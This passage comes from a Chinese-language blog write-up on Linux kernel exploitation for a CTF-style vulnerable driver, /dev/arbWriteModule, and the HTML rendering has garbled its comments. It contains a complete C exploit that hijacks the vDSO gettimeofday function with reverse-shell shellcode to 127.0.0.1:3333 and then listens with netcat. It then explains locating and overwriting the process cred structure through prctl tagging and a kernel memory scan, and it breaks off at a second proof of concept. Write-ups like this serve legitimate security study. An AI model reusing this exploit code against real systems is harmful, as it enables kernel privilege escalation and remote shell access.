class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static exp.c -o exp</span></span><br><span class="line"><span class="comment">// ffffffff810a78d0 T SyS_gettimeofday</span></span><br><span class="line"><span class="comment">// ffffffff810a78d0 T sys_gettimeofday</span></span><br><span class="line"><span class="comment">// ffffffff810b08f0 T do_gettimeofday</span></span><br><span class="line"><span class="comment">// ffffffff810c7350 T compat_SyS_gettimeofday</span></span><br><span class="line"><span class="comment">// ffffffff810c7350 T compat_sys_gettimeofday</span></span><br><span class="line"><span class="comment">//0x13d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GETTIMEOFDAY_FUN 0xB20</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arbWriteNote</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> addr;</span><br><span class="line">    <span class="keyword">ssize_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arbWriteNote</span> <span class="title">arbWriteObj</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”¨äºåå¼¹shellçš„shellcodeï¼Œ127.0.0.1:3333</span></span><br><span class="line"><span class="comment">//æˆ–è€…åœ¨æ¯”èµ›ä¸­å¯ä»¥ç›´æ¥å†™ç±»ä¼¼Orwæ‰“å¼€flagçš„shellcode</span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=<span class="string">&quot;\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//open dev</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> devFD;</span><br><span class="line">    <span class="keyword">int</span> addrFD;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> memOffset;</span><br><span class="line">    <span class="keyword">pthread_t</span> thread;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//open Dev</span></span><br><span class="line">    <span class="keyword">char</span>* pos = <span class="string">&quot;/dev/arbWriteModule&quot;</span>;</span><br><span class="line">    devFD = openDev(pos);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> *buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> gettimeofday_str_offset = get_gettimeofday_str_offset();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;gettimeofday str in vdso.so offset=0x%x\n&quot;</span>,gettimeofday_str_offset);</span><br><span class="line">   <span class="keyword">size_t</span> vdso_addr = <span class="number">-1</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">size_t</span> addr=<span class="number">0xffffffff80000000</span>;addr &lt; <span class="number">0xffffffffffffefff</span>;addr += <span class="number">0x1000</span>) &#123;</span><br><span class="line">      <span class="comment">//è¯»å–ä¸€é¡µæ•°æ®</span></span><br><span class="line">      arbitrary_read(devFD,<span class="number">0x1000</span>,buf,addr);</span><br><span class="line">      <span class="comment">//å¦‚æœåœ¨å¯¹åº”çš„åç§»å¤„ï¼Œæ­£å¥½æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½ç¡®å®šå½“å‰å°±æ˜¯vdsoçš„åœ°å€</span></span><br><span class="line">      <span class="comment">//ä¹‹æ‰€ä»¥èƒ½ç¡®å®šï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æ¯æ¬¡è¯»å–äº†0x1000å­—èŠ‚æ•°æ®ï¼Œä¹Ÿå°±æ˜¯1é¡µï¼Œè€Œvdsoçš„æ˜ å°„ä¹Ÿåªæ˜¯1é¡µ</span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf+gettimeofday_str_offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;[+]find vdso.so!!\n&quot;</span>);</span><br><span class="line">         vdso_addr = addr;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;[+]vdso in kernel addr=0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (vdso_addr == <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]can&#x27;t find vdso.so!!\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">size_t</span> gettimeofday_addr = vdso_addr + GETTIMEOFDAY_FUN;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;[+]gettimeofday function in kernel addr=0x%lx\n&quot;</span>,gettimeofday_addr);</span><br><span class="line">   <span class="comment">//å°†gettimeofdayå¤„å†™å…¥æˆ‘ä»¬çš„shellcodeï¼Œå› ä¸ºå†™æ“ä½œåœ¨å†…æ ¸é©±åŠ¨é‡Œå®Œæˆï¼Œå†…æ ¸å¯ä»¥è¯»å†™æ‰§è¡Œvdso</span></span><br><span class="line">   <span class="comment">//ç”¨æˆ·åªèƒ½è¯»å’Œæ‰§è¡Œvdso</span></span><br><span class="line">   arbitrary_write(devFD,<span class="built_in">strlen</span>(shellcode),shellcode,gettimeofday_addr);</span><br><span class="line">   sleep(<span class="number">1</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;[+]open a shell\n&quot;</span>);</span><br><span class="line">   system(<span class="string">&quot;nc -lvnp 3333&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> devFD;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open %s...\n&quot;</span>,pos);</span><br><span class="line">    <span class="keyword">if</span> ((devFD = open(pos, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Can&#x27;t open device file: %s\n&quot;</span>,pos);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> devFD;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–vdsoé‡Œçš„å­—ç¬¦ä¸²&quot;gettimeofday&quot;ç›¸å¯¹vdso.soçš„åç§»</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="comment">//è·å–å½“å‰ç¨‹åºçš„vdso.soåŠ è½½åœ°å€0x7ffxxxxxxxx</span></span><br><span class="line">   <span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">   <span class="keyword">char</span>* name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line">   <span class="keyword">if</span> (!vdso_addr) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//ä»…éœ€è¦æœç´¢1é¡µå¤§å°å³å¯ï¼Œå› ä¸ºvdsoæ˜ å°„å°±ä¸€é¡µ0x1000</span></span><br><span class="line">   <span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line">   <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_read</span><span class="params">(<span class="keyword">int</span> devFD,<span class="keyword">int</span> len,<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arbWriteObj.len = len;</span><br><span class="line">    arbWriteObj.data = buf;</span><br><span class="line">    arbWriteObj.addr = addr;</span><br><span class="line">    ioctl(devFD,<span class="number">111</span>,&amp;arbWriteObj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arbitrary_write</span><span class="params">(<span class="keyword">int</span> devFD,<span class="keyword">int</span> len,<span class="keyword">char</span> *buf,<span class="keyword">size_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    arbWriteObj.len = len;</span><br><span class="line">    arbWriteObj.data = buf;</span><br><span class="line">    arbWriteObj.addr = addr;</span><br><span class="line">    ioctl(devFD,<span class="number">222</span>,&amp;arbWriteObj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å‚è€ƒï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104694219?ops_request_misc=%7B%22request_id%22:%22163469082516780357227209%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=163469082516780357227209&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-7-104694219.pc_v2_rank_blog_default&utm_term=kernel&spm=1018.2226.3001.4450" >(15æ¡æ¶ˆæ¯) linux kernel pwnå­¦ä¹ ä¹‹åŠ«æŒvdso_seaaseesaçš„åšå®¢-CSDNåšå®¢</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è¿˜æœ‰bsauceå¸ˆå‚…çš„ç®€ä¹¦ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/07994f8b2bb0" >https://www.jianshu.com/p/07994f8b2bb0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="2-åŠ«æŒcredç»“æ„ä½“"   >
          <a href="#2-åŠ«æŒcredç»“æ„ä½“" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åŠ«æŒcredç»“æ„ä½“" class="headerlink" title="2.åŠ«æŒcredç»“æ„ä½“"></a>2.åŠ«æŒcredç»“æ„ä½“</h3>
      
        <h4 id="1-å‰ç½®çŸ¥è¯†-2"   >
          <a href="#1-å‰ç½®çŸ¥è¯†-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®çŸ¥è¯†-2" class="headerlink" title="(1)å‰ç½®çŸ¥è¯†"></a>(1)å‰ç½®çŸ¥è¯†</h4>
      <p>è¿™ä¸ªæ²¡å•¥å¥½è®²çš„ï¼Œå°±æ˜¯è¦†ç›–uigå’Œgidä¸ºé›¶è›‹å°±è¡Œï¼Œå”¯ä¸€éœ€è¦çš„å°±æ˜¯å¯»æ‰¾credçš„åœ°å€ã€‚</p>

        <h4 id="2-å¯»æ‰¾åœ°å€"   >
          <a href="#2-å¯»æ‰¾åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¯»æ‰¾åœ°å€" class="headerlink" title="(2)å¯»æ‰¾åœ°å€"></a>(2)å¯»æ‰¾åœ°å€</h4>
      
        <h5 id="â‘ åˆ©ç”¨prctlå‡½æ•°"   >
          <a href="#â‘ åˆ©ç”¨prctlå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ©ç”¨prctlå‡½æ•°" class="headerlink" title="â‘ åˆ©ç”¨prctlå‡½æ•°"></a>â‘ åˆ©ç”¨prctlå‡½æ•°</h5>
      <p>task_srtuctç»“æ„ä½“æ˜¯æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šåˆ›å»ºçš„ä¸€ä¸ªç»“æ„ä½“ï¼Œä¿å­˜å½“å‰è¿›ç¨‹çš„å¾ˆå¤šå†…å®¹ï¼Œå…¶ä¸­å°±åŒ…æ‹¬å½“å‰è¿›ç¨‹çš„credç»“æ„ä½“æŒ‡é’ˆã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//version 4.4.72</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">//............................................</span></span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">ptracer_cred</span>;</span> <span class="comment">/* Tracer&#x27;s credentials at attach */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment">					 * credentials (COW) */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>	<span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment">					 * credentials (COW) */</span></span><br><span class="line">	<span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">				     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">				       it with task_lock())</span></span><br><span class="line"><span class="comment">				     - initialized normally by setup_new_exec */</span></span><br><span class="line">	<span class="comment">//............................................</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç»™å‡ºçš„é¢˜ç›®ç¼–è¯‘åœ¨4.4.72å†…æ ¸ä¸‹ã€‚</p>
<p>ä¹Ÿå°±æ˜¯å¯ä»¥å°†comm[TASK_COMM_LEN]è®¾ç½®ä¸ºæŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œç›¸å½“äºæ‰“ä¸ªæ ‡è®°ï¼Œä¸è¿‡ä¸åŒç‰ˆæœ¬ä¸­å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œä¸å¦‚æœ€æ–°ç‰ˆæœ¬V5.14.13çš„Linuxå†…æ ¸å°±æœ‰æ‰€ä¸åŒï¼Œå…¶ä¸­è¿˜åŠ äº†ä¸€ä¸ªkeyç»“æ„ä½“æŒ‡é’ˆï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//version 5.14.13</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">//............................................</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For reasons of header soup (see current_thread_info()), this</span></span><br><span class="line"><span class="comment">	 * must be the first element of task_struct.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	stru<span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="comment">/* Cached requested key. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>			*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * executable name, excluding path.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">	 * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">	 * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">char</span>				comm[TASK_COMM_LEN];</span><br><span class="line">	<span class="comment">//............................................</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åå°±å¯ä»¥åˆ©ç”¨prctlå‡½æ•°çš„PR_SET_NAMEåŠŸèƒ½æ¥è®¾ç½®task_structç»“æ„ä½“ä¸­çš„comm[TASK_COMM_LEN]æˆå‘˜ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target,<span class="string">&quot;tryToFindPIG007&quot;</span>);</span><br><span class="line">prctl(PR_SET_NAME,target);</span><br></pre></td></tr></table></div></figure>


        <h5 id="â‘¡å†…å­˜æœç´¢å®šä½"   >
          <a href="#â‘¡å†…å­˜æœç´¢å®šä½" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡å†…å­˜æœç´¢å®šä½" class="headerlink" title="â‘¡å†…å­˜æœç´¢å®šä½"></a>â‘¡å†…å­˜æœç´¢å®šä½</h5>
      <p>é€šè¿‡å†…å­˜æœç´¢ï¼Œæ¯”å¯¹æˆ‘ä»¬è¾“å…¥çš„æ ‡è®°å­—ç¬¦ä¸²ï¼Œå¯ä»¥å®šä½comm[TASK_COMM_LEN]æˆå‘˜åœ°å€ï¼Œæ¯”å¦‚è®¾ç½®æ ‡è®°å­—ç¬¦ä¸²ä¸ºâ€tryToFindPIG007â€:</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020162844.png" alt="image-20211020162844474"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020162934.png" alt="image-20211020162934065"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020163051.png" alt="image-20211020163051697"></p>
<p>å¯ä»¥æŸ¥çœ‹å½“å‰Credç»“æ„ä¸­çš„å†…å®¹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020163136.png" alt="image-20211020163136129"></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//search target chr</span></span><br><span class="line"><span class="keyword">char</span> *buf = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any memory&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">    arbitrary_read(devFD,<span class="number">0x1000</span>,buf,addr);</span><br><span class="line">    result=memmem(buf,<span class="number">0x1000</span>,target,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> (result)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;result:%p\n&quot;</span>,result);</span><br><span class="line">        cred= * (<span class="keyword">size_t</span> *)(result<span class="number">-0x8</span>);</span><br><span class="line">        real_cred= *(<span class="keyword">size_t</span> *)(result<span class="number">-0x10</span>);</span><br><span class="line">        <span class="comment">// if ((cred||0xff00000000000000) &amp;&amp; (real_cred == cred))</span></span><br><span class="line">        <span class="comment">// &#123;</span></span><br><span class="line">        target_addr=addr+result-(<span class="keyword">int</span>)(buf);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>,target_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>,real_cred);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="â‘¢ä»»æ„å†™åŠ«æŒcred"   >
          <a href="#â‘¢ä»»æ„å†™åŠ«æŒcred" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢ä»»æ„å†™åŠ«æŒcred" class="headerlink" title="â‘¢ä»»æ„å†™åŠ«æŒcred"></a>â‘¢ä»»æ„å†™åŠ«æŒcred</h5>
      <p>è¿™ä¸ªå°±ä¸å¤šè¯´äº†ï¼Œè·å–åˆ°credåœ°å€ä¹‹åç›´æ¥å†™å°±è¡Œäº†</p>

        <h4 id="POC-1"   >
          <a href="#POC-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 